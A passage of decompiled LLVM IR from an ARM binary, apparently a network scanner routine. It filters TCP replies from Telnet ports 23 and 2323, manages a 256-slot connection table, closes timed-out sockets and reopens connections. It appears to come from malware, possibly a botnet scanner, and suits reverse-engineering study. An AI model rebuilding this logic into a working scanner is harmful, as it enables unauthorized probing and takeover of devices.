  store i1 %v2_10974, i1* %cpsr_c.global-to-local, align 1
  %v7_10974 = icmp eq i32 %v6_1095c, 39
  store i1 %v7_10974, i1* %cpsr_z.global-to-local, align 1
  %v2_10978 = xor i1 %v2_10974, true
  %v3_10978 = or i1 %v7_10974, %v2_10978
  br i1 %v3_10978, label %dec_label_pc_10934, label %dec_label_pc_1097c

dec_label_pc_1097c:                               ; preds = %dec_label_pc_10974
  store i32 %stack_var_-1880.0, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_27164.91 to i32), i32* %ip.global-to-local, align 4
  %v3_10984 = load i32, i32* %v2_10984, align 4
  store i32 %v3_10984, i32* %r2.global-to-local, align 4
  %v2_10988 = load i32, i32* @global_var_27164.91, align 4
  store i32 %v2_10988, i32* %r3.global-to-local, align 4
  %v3_1098c = icmp uge i32 %v3_10984, %v2_10988
  store i1 %v3_1098c, i1* %cpsr_c.global-to-local, align 1
  %v9_1098c = icmp eq i32 %v3_10984, %v2_10988
  store i1 %v9_1098c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_1098c, label %dec_label_pc_10994, label %dec_label_pc_10934

dec_label_pc_10994:                               ; preds = %dec_label_pc_1097c
  store i32 %stack_var_-1880.0, i32* @lr, align 4
  %v3_10998 = load i8, i8* %v2_10998, align 1
  %v4_10998 = zext i8 %v3_10998 to i32
  store i32 %v4_10998, i32* %r3.global-to-local, align 4
  %v2_1099c = icmp ugt i8 %v3_10998, 5
  store i1 %v2_1099c, i1* %cpsr_c.global-to-local, align 1
  %v7_1099c = icmp eq i8 %v3_10998, 6
  store i1 %v7_1099c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1099c, label %dec_label_pc_109a4, label %dec_label_pc_10934

dec_label_pc_109a4:                               ; preds = %dec_label_pc_10994
  %v0_109a4 = load i32, i32* @r4, align 4
  %v1_109a4 = inttoptr i32 %v0_109a4 to i16*
  %v2_109a4 = load i16, i16* %v1_109a4, align 2
  %v3_109a4 = zext i16 %v2_109a4 to i32
  store i32 %v3_109a4, i32* %ip.global-to-local, align 4
  %v2_109a8 = icmp ugt i16 %v2_109a4, 5887
  store i1 %v2_109a8, i1* %cpsr_c.global-to-local, align 1
  %v7_109a8 = icmp eq i16 %v2_109a4, 5888
  store i1 %v7_109a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_109a8, label %dec_label_pc_109c0, label %dec_label_pc_109b0

dec_label_pc_109b0:                               ; preds = %dec_label_pc_109a4
  store i32 4873, i32* %r3.global-to-local, align 4
  %v3_109b8 = icmp ugt i16 %v2_109a4, 4872
  store i1 %v3_109b8, i1* %cpsr_c.global-to-local, align 1
  %v9_109b8 = icmp eq i16 %v2_109a4, 4873
  store i1 %v9_109b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_109b8, label %dec_label_pc_109c0, label %dec_label_pc_10934

dec_label_pc_109c0:                               ; preds = %dec_label_pc_109b0, %dec_label_pc_109a4
  %v1_109c0 = add i32 %v0_109a4, 2
  %v2_109c0 = inttoptr i32 %v1_109c0 to i16*
  %v3_109c0 = load i16, i16* %v2_109c0, align 2
  %v4_109c0 = zext i16 %v3_109c0 to i32
  store i32 %v4_109c0, i32* %r3.global-to-local, align 4
  store i32 %v4_109c4, i32* %r0.global-to-local, align 4
  %v3_109c8 = icmp uge i32 %v4_109c0, %v4_109c4
  store i1 %v3_109c8, i1* %cpsr_c.global-to-local, align 1
  %v9_109c8 = icmp eq i32 %v4_109c0, %v4_109c4
  store i1 %v9_109c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_109c8, label %dec_label_pc_109d0, label %dec_label_pc_10934

dec_label_pc_109d0:                               ; preds = %dec_label_pc_109c0
  %v1_109d0 = add i32 %v0_109a4, 13
  %v2_109d0 = inttoptr i32 %v1_109d0 to i8*
  %v3_109d0 = load i8, i8* %v2_109d0, align 1
  %v4_109d0 = zext i8 %v3_109d0 to i32
  store i32 %v4_109d0, i32* %r3.global-to-local, align 4
  %v1_109d4 = and i32 %v4_109d0, 2
  %v2_109d4 = icmp eq i32 %v1_109d4, 0
  store i1 %v2_109d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_109d4, label %dec_label_pc_10934, label %dec_label_pc_109dc

dec_label_pc_109dc:                               ; preds = %dec_label_pc_109d0
  %v1_109dc = and i32 %v4_109d0, 16
  %v2_109dc = icmp eq i32 %v1_109dc, 0
  store i1 %v2_109dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_109dc, label %dec_label_pc_10934, label %dec_label_pc_109e4

dec_label_pc_109e4:                               ; preds = %dec_label_pc_109dc
  %v1_109e4 = and i32 %v4_109d0, 4
  %v2_109e4 = icmp eq i32 %v1_109e4, 0
  store i1 %v2_109e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_109e4, label %dec_label_pc_109ec, label %dec_label_pc_10934

dec_label_pc_109ec:                               ; preds = %dec_label_pc_109e4
  %tmp532 = urem i8 %v3_109d0, 2
  %v2_109ec = icmp eq i8 %tmp532, 0
  store i1 %v2_109ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_109ec, label %dec_label_pc_109f4, label %dec_label_pc_10934

dec_label_pc_109f4:                               ; preds = %dec_label_pc_109ec
  %v1_109f4 = add i32 %v0_109a4, 8
  %v2_109f4 = inttoptr i32 %v1_109f4 to i32*
  %v3_109f4 = load i32, i32* %v2_109f4, align 4
  %v5_10a0c = call i32 @llvm.bswap.i32(i32 %v3_109f4)
  %v1_10a10 = add i32 %v5_10a0c, -1
  store i32 %v1_10a10, i32* %r2.global-to-local, align 4
  %v1_10a14 = and i32 %v1_10a10, 16711680
  store i32 %v1_10a14, i32* %r0.global-to-local, align 4
  %v3_10a18 = udiv i32 %v1_10a10, 16777216
  %v4_10a20 = udiv i32 %v1_10a14, 256
  %v5_10a20 = or i32 %v4_10a20, %v3_10a18
  %v1_10a1c = mul i32 %v1_10a10, 256
  %v4_10a24 = and i32 %v1_10a1c, 16711680
  %v5_10a24 = or i32 %v5_10a20, %v4_10a24
  store i32 %v5_10a24, i32* %r3.global-to-local, align 4
  store i32 %stack_var_-1880.0, i32* %r1.global-to-local, align 4
  %v3_10a2c = load i32, i32* %v2_10a2c, align 4
  store i32 %v3_10a2c, i32* @lr, align 4
  %v5_10a30 = call i32 @llvm.bswap.i32(i32 %v1_10a10)
  store i32 %v5_10a30, i32* %r3.global-to-local, align 4
  %v3_10a34 = icmp uge i32 %v5_10a30, %v3_10a2c
  store i1 %v3_10a34, i1* %cpsr_c.global-to-local, align 1
  %v9_10a34 = icmp eq i32 %v5_10a30, %v3_10a2c
  store i1 %v9_10a34, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_10a34, label %dec_label_pc_10a3c, label %dec_label_pc_10934

dec_label_pc_10a3c:                               ; preds = %dec_label_pc_109f4
  %v0_10a3c = load i32, i32* @r5, align 4
  %v2_10a3c = icmp ugt i32 %v0_10a3c, 254
  store i1 %v2_10a3c, i1* %cpsr_c.global-to-local, align 1
  %v7_10a3c = icmp eq i32 %v0_10a3c, 255
  store i1 %v7_10a3c, i1* %cpsr_z.global-to-local, align 1
  %v8_10a40 = icmp sgt i32 %v0_10a3c, 255
  br i1 %v8_10a40, label %dec_label_pc_10ad0, label %dec_label_pc_10a44

dec_label_pc_10a44:                               ; preds = %dec_label_pc_10a3c
  %v2_10a4c = load i32, i32* @global_var_2717c.174, align 4
  store i32 %v2_10a4c, i32* %r1.global-to-local, align 4
  %v3_10a50 = mul i32 %v0_10a3c, 256
  store i32 %v3_10a50, i32* %r2.global-to-local, align 4
  %v2_10a54 = mul i32 %v0_10a3c, 288
  store i32 %v2_10a54, i32* %r3.global-to-local, align 4
  %v2_10a58 = add i32 %v2_10a4c, %v2_10a54
  store i32 %v2_10a58, i32* @r0, align 4
  %v1_10a5c = add i32 %v2_10a58, 12
  %v2_10a5c = inttoptr i32 %v1_10a5c to i32*
  %v3_10a5c = load i32, i32* %v2_10a5c, align 4
  store i32 %v3_10a5c, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10a60 = icmp eq i32 %v3_10a5c, 0
  store i1 %v2_10a60, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10a60, label %dec_label_pc_10aa4, label %dec_label_pc_10a80.preheader

dec_label_pc_10a80.preheader:                     ; preds = %dec_label_pc_10a44
  %v2_10a64 = add i32 %v0_10a3c, 1
  %v2_10a6c = and i32 %v2_10a64, 134217728
  %v3_10a6c = icmp ne i32 %v2_10a6c, 0
  store i1 %v3_10a6c, i1* %cpsr_c.global-to-local, align 1
  %v3_10a70 = mul i32 %v2_10a64, 288
  %v3_10a74 = add i32 %v2_10a4c, %v3_10a70
  store i32 %v3_10a74, i32* %r3.global-to-local, align 4
  store i32 %v0_10a3c, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_10a80

dec_label_pc_10a80:                               ; preds = %dec_label_pc_10a80.preheader, %dec_label_pc_10a8c
  %v0_10a8c = phi i32 [ %v3_10a74, %dec_label_pc_10a80.preheader ], [ %v1_10a98, %dec_label_pc_10a8c ]
  %v0_10a80 = phi i32 [ %v0_10a3c, %dec_label_pc_10a80.preheader ], [ %v1_10a80, %dec_label_pc_10a8c ]
  %v1_10a80 = add i32 %v0_10a80, 1
  store i32 %v1_10a80, i32* %r2.global-to-local, align 4
  %v7_10a84 = icmp eq i32 %v1_10a80, 256
  br i1 %v7_10a84, label %dec_label_pc_10ad0.loopexit, label %dec_label_pc_10a8c

dec_label_pc_10a8c:                               ; preds = %dec_label_pc_10a80
  store i32 %v0_10a8c, i32* @r0, align 4
  %v1_10a90 = add i32 %v0_10a8c, 12
  %v2_10a90 = inttoptr i32 %v1_10a90 to i32*
  %v3_10a90 = load i32, i32* %v2_10a90, align 4
  %v2_10a94 = icmp eq i32 %v3_10a90, 0
  %v1_10a98 = add i32 %v0_10a8c, 288
  store i32 %v1_10a98, i32* %r3.global-to-local, align 4
  br i1 %v2_10a94, label %dec_label_pc_10aa0, label %dec_label_pc_10a80

dec_label_pc_10aa0:                               ; preds = %dec_label_pc_10a8c
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_10a80, i32* @r5, align 4
  br label %dec_label_pc_10aa4

dec_label_pc_10aa4:                               ; preds = %dec_label_pc_10a44, %dec_label_pc_10aa0
  %v1_10aac = phi i32 [ %v2_10a58, %dec_label_pc_10a44 ], [ %v0_10a8c, %dec_label_pc_10aa0 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10aa4 = icmp eq i32 %v1_10aac, 0
  store i1 %v2_10aa4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10aa4, label %dec_label_pc_10ad0, label %dec_label_pc_10aac

dec_label_pc_10aac:                               ; preds = %dec_label_pc_10aa4
  %v2_10aac = add i32 %v1_10aac, 16
  %v3_10aac = inttoptr i32 %v2_10aac to i32*
  store i32 %v3_10a2c, i32* %v3_10aac, align 4
  %v0_10ab0 = load i32, i32* %ip.global-to-local, align 4
  %v1_10ab0 = trunc i32 %v0_10ab0 to i16
  %v2_10ab0 = load i32, i32* @r0, align 4
  %v3_10ab0 = add i32 %v2_10ab0, 20
  %v4_10ab0 = inttoptr i32 %v3_10ab0 to i16*
  store i16 %v1_10ab0, i16* %v4_10ab0, align 2
  %v0_10ab4 = call i32 @setup_connection()
  store i32 %v0_10ab4, i32* %r0.global-to-local, align 4
  %v1_10938.pre.pre = load i32, i32* @sb, align 4
  br label %dec_label_pc_10934

dec_label_pc_10abc:                               ; preds = %dec_label_pc_f96c
  store i32 ptrtoint (i32* @global_var_27180.176 to i32), i32* %ip.global-to-local, align 4
  %v2_10ac0 = load i32, i32* @global_var_27180.176, align 4
  store i32 %v2_10ac0, i32* %r0.global-to-local, align 4
  %v1_10ac4 = call i32 @__GI___libc_close(i32 %v2_10ac0)
  store i32 %v1_10ac4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10ac8

dec_label_pc_10ac8:                               ; preds = %dec_label_pc_f948, %dec_label_pc_10abc
  %v0_10ac8 = load i32, i32* @r5, align 4
  store i32 %v0_10ac8, i32* %r0.global-to-local, align 4
  %v1_10acc = call i32 @__GI_exit(i32 %v0_10ac8)
  store i32 %v1_10acc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10ad0

dec_label_pc_10ad0.loopexit:                      ; preds = %dec_label_pc_10a80
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_10ad0

dec_label_pc_10ad0:                               ; preds = %dec_label_pc_10aa4, %dec_label_pc_10a3c, %dec_label_pc_10968, %dec_label_pc_10934, %dec_label_pc_10ad0.loopexit, %dec_label_pc_10ac8
  %stack_var_-1880.1 = phi i32 [ %tmp314, %dec_label_pc_10ac8 ], [ %stack_var_-1880.0, %dec_label_pc_10ad0.loopexit ], [ %stack_var_-1880.0, %dec_label_pc_10934 ], [ %stack_var_-1880.0, %dec_label_pc_10968 ], [ %stack_var_-1880.0, %dec_label_pc_10a3c ], [ %stack_var_-1880.0, %dec_label_pc_10aa4 ]
  %stack_var_-1876.1 = phi i16 [ %tmp342, %dec_label_pc_10ac8 ], [ %stack_var_-1876.0, %dec_label_pc_10ad0.loopexit ], [ %stack_var_-1876.0, %dec_label_pc_10934 ], [ %stack_var_-1876.0, %dec_label_pc_10968 ], [ %stack_var_-1876.0, %dec_label_pc_10a3c ], [ %stack_var_-1876.0, %dec_label_pc_10aa4 ]
  store i32 0, i32* %stack_var_-224, align 4
  store i32 1668, i32* %ip.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_10aec486 = load i32, i32* @sp, align 4
  %v3_10aec487 = add i32 %v2_10aec486, 1668
  %v4_10aec488 = inttoptr i32 %v3_10aec487 to i32*
  store i32 0, i32* %v4_10aec488, align 4
  br label %dec_label_pc_10adc.dec_label_pc_10adc_crit_edge

dec_label_pc_10adc.dec_label_pc_10adc_crit_edge:  ; preds = %dec_label_pc_10ad0, %dec_label_pc_10adc.dec_label_pc_10adc_crit_edge
  %v0_10adc.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_10adc = add i32 %v0_10adc.pre, 1664
  store i32 %v1_10adc, i32* %ip.global-to-local, align 4
  %v1_10ae0 = add i32 %v0_10adc.pre, 4
  store i32 %v1_10ae0, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v7_10ae8 = icmp eq i32 %v1_10ae0, 128
  %v2_10aec = load i32, i32* @sp, align 4
  %v3_10aec = add i32 %v2_10aec, %v1_10adc
  %v4_10aec = inttoptr i32 %v3_10aec to i32*
  store i32 0, i32* %v4_10aec, align 4
  br i1 %v7_10ae8, label %dec_label_pc_10af4, label %dec_label_pc_10adc.dec_label_pc_10adc_crit_edge

dec_label_pc_10af4:                               ; preds = %dec_label_pc_10adc.dec_label_pc_10adc_crit_edge
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  %v0_10af4 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_10af4, i32* %stack_var_-352, align 4
  %v1_10afc480 = add i32 %v0_10af4, 1540
  store i32 %v1_10afc480, i32* @lr, align 4
  %v1_10b00481 = add i32 %v0_10af4, 8
  store i32 %v1_10b00481, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v7_10b08482 = icmp eq i32 %v1_10b00481, 128
  %v2_10b0c483 = load i32, i32* @sp, align 4
  %v3_10b0c484 = add i32 %v2_10b0c483, %v1_10afc480
  %v4_10b0c485 = inttoptr i32 %v3_10b0c484 to i32*
  store i32 0, i32* %v4_10b0c485, align 4
  br i1 %v7_10b08482, label %dec_label_pc_10b14, label %dec_label_pc_10afc.dec_label_pc_10afc_crit_edge

dec_label_pc_10afc.dec_label_pc_10afc_crit_edge:  ; preds = %dec_label_pc_10af4, %dec_label_pc_10afc.dec_label_pc_10afc_crit_edge
  %v0_10afc.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_10afc = add i32 %v0_10afc.pre, 1536
  store i32 %v1_10afc, i32* @lr, align 4
  %v1_10b00 = add i32 %v0_10afc.pre, 4
  store i32 %v1_10b00, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v7_10b08 = icmp eq i32 %v1_10b00, 128
  %v2_10b0c = load i32, i32* @sp, align 4
  %v3_10b0c = add i32 %v2_10b0c, %v1_10afc
  %v4_10b0c = inttoptr i32 %v3_10b0c to i32*
  store i32 0, i32* %v4_10b0c, align 4
  br i1 %v7_10b08, label %dec_label_pc_10b14, label %dec_label_pc_10afc.dec_label_pc_10afc_crit_edge

dec_label_pc_10b14:                               ; preds = %dec_label_pc_10afc.dec_label_pc_10afc_crit_edge, %dec_label_pc_10af4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  %v0_10b14 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_10b14, i32* @r6, align 4
  store i32 %v0_10b14, i32* @r5, align 4
  %v5_10b1c = trunc i32 %v0_10b14 to i16
  store i16 %v5_10b1c, i16* %stack_var_-52, align 2
  %v2_11930 = ptrtoint i32* %stack_var_-40 to i32
  br label %dec_label_pc_10b74

dec_label_pc_10b24:                               ; preds = %dec_label_pc_10ba4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_10b90, i1* %cpsr_z.global-to-local, align 1
  %v1_11920 = add i32 %v2_10b88, 4
  %v2_11920 = inttoptr i32 %v1_11920 to i32*
  %v3_11920 = load i32, i32* %v2_11920, align 4
  br i1 %v7_10b90, label %dec_label_pc_11920, label %dec_label_pc_10b2c

dec_label_pc_10b2c:                               ; preds = %dec_label_pc_10b24
  store i32 %v3_11920, i32* %ip.global-to-local, align 4
  %v3_10b34 = udiv i32 %v3_11920, 32
  store i32 %v2_11930, i32* %r0.global-to-local, align 4
  %v3_10b3c = mul nuw nsw i32 %v3_10b34, 4
  %v2_10b40 = add i32 %v3_10b3c, %v2_11930
  store i32 %v2_10b40, i32* %r3.global-to-local, align 4
  %v1_10b44 = add i32 %v2_10b40, -184
  %v2_10b44 = inttoptr i32 %v1_10b44 to i32*
  %v3_10b44 = load i32, i32* %v2_10b44, align 4
  %v1_10b48 = urem i32 %v3_11920, 32
  store i32 %v1_10b48, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v7_10b50 = shl i32 1, %v1_10b48
  %v8_10b50 = or i32 %v3_10b44, %v7_10b50
  store i32 %v8_10b50, i32* %r2.global-to-local, align 4
  store i32 %v8_10b50, i32* %v2_10b44, align 4
  %v0_10b58 = load i32, i32* @r6, align 4
  %v1_10b58 = load i32, i32* %ip.global-to-local, align 4
  %v3_10b58 = icmp uge i32 %v0_10b58, %v1_10b58
  store i1 %v3_10b58, i1* %cpsr_c.global-to-local, align 1
  %v9_10b58 = icmp eq i32 %v0_10b58, %v1_10b58
  store i1 %v9_10b58, i1* %cpsr_z.global-to-local, align 1
  %v5_10b5c = icmp slt i32 %v0_10b58, %v1_10b58
  br i1 %v5_10b5c, label %bb377, label %bb378

bb377:                                            ; preds = %dec_label_pc_10b2c
  store i32 %v1_10b58, i32* @r6, align 4
  br label %bb378

bb378:                                            ; preds = %.thread56, %bb384, %bb382, %bb428, %dec_label_pc_10c08, %dec_label_pc_10b2c, %bb377
  %v3_10b60 = load i16, i16* %stack_var_-52, align 2
  %v4_10b60 = sext i16 %v3_10b60 to i32
  store i32 %v4_10b60, i32* %r3.global-to-local, align 4
  %v1_10b64 = add nsw i32 %v4_10b60, 1
  store i32 %v1_10b64, i32* %r2.global-to-local, align 4
  %v2_10b68 = icmp ugt i32 %v1_10b64, 254
  store i1 %v2_10b68, i1* %cpsr_c.global-to-local, align 1
  %v7_10b68 = icmp eq i32 %v1_10b64, 255
  store i1 %v7_10b68, i1* %cpsr_z.global-to-local, align 1
  %v5_10b6c = trunc i32 %v1_10b64 to i16
  store i16 %v5_10b6c, i16* %stack_var_-52, align 2
  %v8_10b70 = icmp sgt i16 %v3_10b60, 254
  br i1 %v8_10b70, label %dec_label_pc_10c14, label %dec_label_pc_10b74

dec_label_pc_10b74:                               ; preds = %bb378, %dec_label_pc_10b14
  %v0_10b80 = phi i32 [ %v1_10b64, %bb378 ], [ %v0_10b14, %dec_label_pc_10b14 ]
  store i32 ptrtoint (i32* @global_var_2717c.174 to i32), i32* %r0.global-to-local, align 4
  %v3_10b78 = mul i32 %v0_10b80, 256
  store i32 %v3_10b78, i32* %r3.global-to-local, align 4
  %v2_10b7c = load i32, i32* @global_var_2717c.174, align 4
  store i32 %v2_10b7c, i32* @r1, align 4
  %v2_10b84 = mul i32 %v0_10b80, 288
  store i32 %v2_10b84, i32* %r2.global-to-local, align 4
  %v2_10b88 = add i32 %v2_10b7c, %v2_10b84
  store i32 %v2_10b88, i32* @r4, align 4
  %v1_10b8c = add i32 %v2_10b88, 12
  %v2_10b8c = inttoptr i32 %v1_10b8c to i32*
  %v3_10b8c = load i32, i32* %v2_10b8c, align 4
  store i32 %v3_10b8c, i32* %ip.global-to-local, align 4
  %v2_10b90 = icmp ne i32 %v3_10b8c, 0
  store i1 %v2_10b90, i1* %cpsr_c.global-to-local, align 1
  %v7_10b90 = icmp eq i32 %v3_10b8c, 1
  store i1 %v7_10b90, i1* %cpsr_z.global-to-local, align 1
  %v2_10b94 = xor i1 %v2_10b90, true
  %v3_10b94 = or i1 %v7_10b90, %v2_10b94
  br i1 %v3_10b94, label %bb379, label %bb380

bb379:                                            ; preds = %dec_label_pc_10b74
  store i32 5, i32* @r1, align 4
  br label %bb380

bb380:                                            ; preds = %dec_label_pc_10b74, %bb379
  %v1_10bb4173 = phi i32 [ %v2_10b7c, %dec_label_pc_10b74 ], [ 5, %bb379 ]
  %v2_10b98 = xor i1 %v7_10b90, true
  %v3_10b98 = and i1 %v2_10b90, %v2_10b98
  br i1 %v3_10b98, label %bb381, label %bb382

bb381:                                            ; preds = %bb380
  store i32 30, i32* @r1, align 4
  br label %bb382

bb382:                                            ; preds = %bb380, %bb381
  %v1_10bb4 = phi i32 [ %v1_10bb4173, %bb380 ], [ 30, %bb381 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10b9c = icmp eq i32 %v3_10b8c, 0
  store i1 %v2_10b9c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10b9c, label %bb378, label %dec_label_pc_10ba4

dec_label_pc_10ba4:                               ; preds = %bb382
  store i32 ptrtoint (i32* @global_var_2469c.163 to i32), i32* %r2.global-to-local, align 4
  %v2_10ba8 = load i32, i32* @global_var_2469c.163, align 4
  store i32 %v2_10ba8, i32* %r3.global-to-local, align 4
  %v1_10bac = add i32 %v2_10b88, 8
  %v2_10bac = inttoptr i32 %v1_10bac to i32*
  %v3_10bac = load i32, i32* %v2_10bac, align 4
  store i32 %v3_10bac, i32* %r2.global-to-local, align 4
  %v2_10bb0 = sub i32 %v2_10ba8, %v3_10bac
  store i32 %v2_10bb0, i32* %r3.global-to-local, align 4
  %v3_10bb4 = icmp uge i32 %v2_10bb0, %v1_10bb4
  store i1 %v3_10bb4, i1* %cpsr_c.global-to-local, align 1
  %v9_10bb4 = icmp eq i32 %v2_10bb0, %v1_10bb4
  store i1 %v9_10bb4, i1* %cpsr_z.global-to-local, align 1
  %v2_10bb8 = xor i1 %v3_10bb4, true
  %v3_10bb8 = or i1 %v9_10bb4, %v2_10bb8
  br i1 %v3_10bb8, label %dec_label_pc_10b24, label %dec_label_pc_10bbc

dec_label_pc_10bbc:                               ; preds = %dec_label_pc_10ba4
  %v1_10bbc = add i32 %v2_10b88, 4
  %v2_10bbc = inttoptr i32 %v1_10bbc to i32*
  %v3_10bbc = load i32, i32* %v2_10bbc, align 4
  store i32 %v3_10bbc, i32* %r0.global-to-local, align 4
  %v1_10bc0 = call i32 @__GI___libc_close(i32 %v3_10bbc)
  store i32 %v1_10bc0, i32* %r0.global-to-local, align 4
  %v0_10bc4 = load i32, i32* @r4, align 4
  %v1_10bc4 = add i32 %v0_10bc4, 12
  %v2_10bc4 = inttoptr i32 %v1_10bc4 to i32*
  %v3_10bc4 = load i32, i32* %v2_10bc4, align 4
  store i32 %v3_10bc4, i32* %r3.global-to-local, align 4
  %v2_10bc8 = icmp ugt i32 %v3_10bc4, 1
  store i1 %v2_10bc8, i1* %cpsr_c.global-to-local, align 1
  %v7_10bc8 = icmp eq i32 %v3_10bc4, 2
  store i1 %v7_10bc8, i1* %cpsr_z.global-to-local, align 1
  %v2_10bcc = xor i1 %v2_10bc8, true
  %v3_10bcc = or i1 %v7_10bc8, %v2_10bcc
  br i1 %v3_10bcc, label %bb383, label %.thread279

.thread279:                                       ; preds = %dec_label_pc_10bbc
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_10bd4276280 = add i32 %v0_10bc4, 4
  %v3_10bd4277281 = inttoptr i32 %v2_10bd4276280 to i32*
  store i32 -1, i32* %v3_10bd4277281, align 4
  br label %bb384

bb383:                                            ; preds = %dec_label_pc_10bbc
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_10bd4273 = add i32 %v0_10bc4, 4
  %v3_10bd4274 = inttoptr i32 %v2_10bd4273 to i32*
  store i32 -1, i32* %v3_10bd4274, align 4
  %v4_10bd8 = load i32, i32* %r3.global-to-local, align 4
  %v5_10bd8 = load i32, i32* @r4, align 4
  %v6_10bd8 = add i32 %v5_10bd8, 12
  %v7_10bd8 = inttoptr i32 %v6_10bd8 to i32*
  store i32 %v4_10bd8, i32* %v7_10bd8, align 4
  %v4_10bdc = load i32, i32* %r3.global-to-local, align 4
  %v5_10bdc = trunc i32 %v4_10bdc to i8
  %v6_10bdc = load i32, i32* @r4, align 4
  %v7_10bdc = add i32 %v6_10bdc, 284
  %v8_10bdc = inttoptr i32 %v7_10bdc to i8*
  store i8 %v5_10bdc, i8* %v8_10bdc, align 1
  %v0_10be0.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_10be0.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  br label %bb384

bb384:                                            ; preds = %.thread279, %bb383
  %v1_10be0 = phi i1 [ %v1_10be0.pre, %bb383 ], [ %v2_10bc8, %.thread279 ]
  %v0_10be0 = phi i1 [ %v0_10be0.pre, %bb383 ], [ false, %.thread279 ]
  %v2_10be0 = xor i1 %v1_10be0, true
  %v3_10be0 = or i1 %v0_10be0, %v2_10be0
  br i1 %v3_10be0, label %bb378, label %dec_label_pc_10be4

dec_label_pc_10be4:                               ; preds = %bb384
  %v0_10be4 = load i32, i32* @r4, align 4
  %v1_10be4 = add i32 %v0_10be4, 284
  %v2_10be4 = inttoptr i32 %v1_10be4 to i8*
  %v3_10be4 = load i8, i8* %v2_10be4, align 1
  %v4_10be4 = zext i8 %v3_10be4 to i32
  %v1_10be8 = add nuw nsw i32 %v4_10be4, 1
  %v1_10bec = urem i32 %v1_10be8, 256
  store i32 %v1_10bec, i32* %r3.global-to-local, align 4
  %v2_10bf0 = icmp ugt i32 %v1_10bec, 9
  store i1 %v2_10bf0, i1* %cpsr_c.global-to-local, align 1
  %v7_10bf0 = icmp eq i32 %v1_10bec, 10
  store i1 %v7_10bf0, i1* %cpsr_z.global-to-local, align 1
  %v1_10bf4 = trunc i32 %v1_10be8 to i8
  store i8 %v1_10bf4, i8* %v2_10be4, align 1
  %v0_10bf8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_10bf8, label %.thread56, label %dec_label_pc_10c08

.thread56:                                        ; preds = %dec_label_pc_10be4
  %v1_10bf8 = load i32, i32* %r3.global-to-local, align 4
  %v2_10bf8 = add i32 %v1_10bf8, -10
  store i32 %v2_10bf8, i32* %r3.global-to-local, align 4
  %v2_10bfc = load i32, i32* @r4, align 4
  %v3_10bfc = add i32 %v2_10bfc, 12
  %v4_10bfc = inttoptr i32 %v3_10bfc to i32*
  store i32 %v2_10bf8, i32* %v4_10bfc, align 4
  %v1_10c00 = load i32, i32* %r3.global-to-local, align 4
  %v2_10c00 = trunc i32 %v1_10c00 to i8
  %v3_10c00 = load i32, i32* @r4, align 4
  %v4_10c00 = add i32 %v3_10c00, 284
  %v5_10c00 = inttoptr i32 %v4_10c00 to i8*
  store i8 %v2_10c00, i8* %v5_10c00, align 1
  %v0_10c04.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_10c04.pr.pr, label %bb378, label %dec_label_pc_10c08

dec_label_pc_10c08:                               ; preds = %dec_label_pc_10be4, %.thread56
  %v0_10c08 = load i32, i32* @r4, align 4
  store i32 %v0_10c08, i32* @r0, align 4
  %v0_10c0c = call i32 @setup_connection()
  store i32 %v0_10c0c, i32* %r0.global-to-local, align 4
  br label %bb378

dec_label_pc_10c14:                               ; preds = %bb378
  store i32 0, i32* @r4, align 4
  store i32 1, i32* %stack_var_-68, align 4
  %v0_10c20 = load i32, i32* @r5, align 4
  %v1_10c20 = load i32, i32* @r6, align 4
  %v3_10c20 = icmp uge i32 %v0_10c20, %v1_10c20
  store i1 %v3_10c20, i1* %cpsr_c.global-to-local, align 1
  %v9_10c20 = icmp eq i32 %v0_10c20, %v1_10c20
  store i1 %v9_10c20, i1* %cpsr_z.global-to-local, align 1
  %v5_10c24 = icmp slt i32 %v0_10c20, %v1_10c20
  %storemerge134 = select i1 %v5_10c24, i32 %v1_10c20, i32 %v0_10c20
